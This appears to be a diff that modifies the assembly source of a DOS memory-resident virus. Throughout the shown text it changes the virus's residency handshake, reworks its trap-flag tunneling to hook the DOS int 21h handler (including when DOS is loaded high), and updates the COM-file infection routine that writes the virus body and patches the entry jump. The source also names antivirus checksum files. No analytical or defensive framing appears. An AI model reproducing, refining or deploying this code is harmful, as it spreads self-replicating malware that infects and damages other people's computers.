@@ -36,7 +36,7 @@
 VirusSize	equ	EndVirus-BeginVirus
 ParagraphSize	equ	VirusSize/16+2
 VirusInterrupt	equ	7979h
-VirusIdentifier	equ	'bA'
+VirusHandshake	equ	'JG'
 
 ;---------------------------------------------------------------------
 ;	The virus begins here
@@ -67,7 +67,7 @@ BeginEncryptedSection:
 InstallVirus:
 	mov	ax, VirusInterrupt			; Check if in mem
 	int	21h
-	cmp	ax, VirusIdentifier
+	cmp	ax, VirusHandshake
 	je	AlreadyResident
 
 	mov	ah, 4ah					; Get size of mem
@@ -166,8 +166,7 @@ InstallInt21hHandler:
 
 	pushf						; Get flags
 	pop	ax
-	test	ah, 1h					; Check trap flag
-	pushf
+	push	ax
 	and	ah, 0feh				; Turn off trap flag
 	push	ax
 	popf
@@ -178,13 +177,15 @@ InstallInt21hHandler:
 	push	cs
 	pop	ds
 
-	popf
-	jnz	@@next2
+	pop	cx					; Discard leftover flags
+	cmp	byte ptr cs:Tunneled, 1			; Did the tunnel install?
+	je	@@next2
 
-	mov	ah, 25h
-	mov	dx, offset Int21hHandler
+	mov	ax, 2521h				; No, fall back to a plain
+	mov	dx, offset Int21hHandler		; int21 vector hook
 	int	21h
 @@next2:retf
+Tunneled	db	0
 
 Int01hHandler:
 	mov	cs:OrigAx, ax				; Save registers
@@ -229,7 +230,10 @@ OrigCx	dw	?
 	mov	si, si[3]
 @@next5:db	81h, 7ch, 02h				; cmp ds:si[2], mcb
 OrigMcb	dw	?					; See if jmp is to dos
-	jnb	@@next6
+	jb	@@dohook				; Below MCB: DOS in low mem
+	cmp	word ptr [si+2], 0f000h			; In HMA: DOS loaded high
+	jb	@@next6					; Between: a TSR, keep tracing
+@@dohook:
 	push	ax
 	mov	ax, si[0]				; Get offset address
 	mov	cs:Int21o, ax
@@ -238,6 +242,7 @@ OrigMcb	dw	?					; See if jmp is to dos
 	mov	si[0], offset Int21hHandler		; Install int21 handler
 	mov	si[2], cs
 	pop	ax
+	mov	byte ptr cs:Tunneled, 1			; Record successful tunnel
 	and	ch, 0feh				; Clear trap flag
 @@next6:pop	si
 	jmp	@@next2
@@ -249,7 +254,7 @@ OrigMcb	dw	?					; See if jmp is to dos
 Int21hHandler:
 	cmp	ax, VirusInterrupt			; Return installation
 	jne	@@next1
-	mov	ax, VirusIdentifier
+	mov	ax, VirusHandshake
 	iret
 @@next1:cmp	ax, 4b00h				; Check for exec?
 	jne	@@next2
@@ -433,7 +438,7 @@ InfectComFile:
 	mov	byte ptr ComFlag, 1
 
 	add	ax, offset EntryPoint-103h		; Calculate entryjmp
-	mov	word ptr [ComHead+1], ax
+	mov	word ptr [NewJmp+1], ax
 
 	call	WriteVirus
 
@@ -441,7 +446,7 @@ InfectComFile:
 	call	SetFilePointer
 
 	mov	cx, 3
-	mov	dx, offset ComHead
+	mov	dx, offset NewJmp
 	mov	ah, 40h
 	int	21h
 
@@ -513,7 +518,7 @@ WriteVirus:
 AVfile1	db	'ANTI-VIR.DAT', 0
 AVfile2	db	'CHKLIST.MS', 0
 FileHnd	dw	0					; Filehandle
-ComHead	db	0e9h, 00h, 00h				; Buffer for entryjmp
+NewJmp	db	0e9h, 00h, 00h				; Buffer for entryjmp
 ComFlag	db	1
 ExeHead	db	0cdh, 20h, 00h, 21 dup (0)
 
